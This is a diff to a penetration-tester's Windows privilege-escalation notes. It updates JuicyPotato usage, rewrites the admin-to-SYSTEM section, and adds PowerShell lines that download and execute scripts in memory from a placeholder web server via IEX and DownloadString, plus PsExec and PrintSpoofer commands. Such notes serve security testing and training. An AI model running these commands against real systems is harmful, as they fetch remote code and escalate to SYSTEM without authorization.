@@ -6,7 +6,7 @@ target.
 To leverage a shell from a Remote Code Execution (RCE) vulnerability please
 refer to the `[General] Shells` note.
 
-“The more you look, the more you see.”  
+“The more you look, the more you see.”
 ― Pirsig, Robert M., Zen and the Art of Motorcycle Maintenance
 
 ### Basic enumeration
@@ -1576,13 +1576,14 @@ Potato`. A list of services' `CLSID` that can be leveraged for privilege
 escalation is available on the tool GitHub repository:
 `https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md`
 
-```
+```bash
 Mandatory args:
 -t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
 -p <BINARY>: program to launch
 -l <PORT>: COM server listen port
 
-JuicyPotato.exe -t * -c <CLSID> -l <PORT> -p <cmd.exe | powershell.exe | BINARY>
+# If no CLSID is provided, JuicyPotato will attempt by default to leverage the BITS service DCOM server (CLID {4991d34b-80a1-4291-83b6-3328366b9097}).
+JuicyPotato.exe -t * [-c <CLSID>] -l <PORT> -p <cmd.exe | powershell.exe | BINARY> [-a "<COMMAND_LINE_ARGUMENTS>"]
 ```
 
 ###### Rotten Potato x64 w/ Metasploit
@@ -1655,19 +1656,18 @@ Start-Service -Name Spooler
 PrintSpoofer.exe [-i] -c "<cmd.exe | powershell.exe | BINARY_PATH | cmd.exe COMMAND_LINE_ARGUMENTS | ...>"
 ```
 
-### Administrator to SYSTEM
+### Local administrator to NT AUTHORITY\SYSTEM
 
-The `NT AUTHORITY\ SYSTEM` account and the members of the `Administrators`
-local group have the same file privileges, but they have different functions.  
-The system account is used by the operating system and by services that run
-under Windows. It is an internal account, does not show up in User Manager,
-cannot be added to any groups, and cannot have user rights assigned to it.  
-The system account is needed by tools that make us of Debug Privilege
-(such as `mimikatz`) which allows someone to debug a process that they wouldn’t
-otherwise have access to.
+The `LocalSystem` account (associated with the `NT AUTHORITY\SYSTEM` `SID`) is
+used by the operating system and by services that run under Windows. It is an
+internal account, which does not show up in User Manager and cannot be added to
+any security groups. Executing code under the `LocalSystem` account may be
+needed in some circumstances (for example to leverage specific privileges
+associated with the `LocalSystem` account, such as the `SeTcbPrivilege`
+privilege).
 
-The `PsExec` Microsoft signed tool can be used to elevate to system privilege
-from an administrator account:
+The `PsExec` Microsoft signed tool can be used to elevate to `LocalSystem`
+from an administrator account (through a Windows service):
 
 ```
 # -s   Run the remote process in the System account.
@@ -1675,6 +1675,18 @@ from an administrator account:
 # -d   Don't wait for process to terminate (non-interactive).
 
 psexec.exe -accepteula -s -i -d cmd.exe
+```
+
+The [`Invoke-CommandAs`](https://github.com/mkellerman/Invoke-CommandAs)
+PowerShell cmdlet can also be used to execute code as `LocalSystem` account
+(through a Scheduled Task):
+
+```
+# Injects the Module in memory.
+IEX (New-Object Net.WebClient).DownloadString("http://<WEB_SERVER>/Invoke-CommandAs/Private/Invoke-ScheduledTask.ps1")
+IEX (New-Object Net.WebClient).DownloadString("http://<WEB_SERVER>/Invoke-CommandAs/Public/Invoke-CommandAs.ps1")
+
+Invoke-CommandAs -AsSystem -ScriptBlock { <POWERSHELL_CODE> }
 ```
 
 If a `meterpreter` shell is being used, the `getsystem` command can be
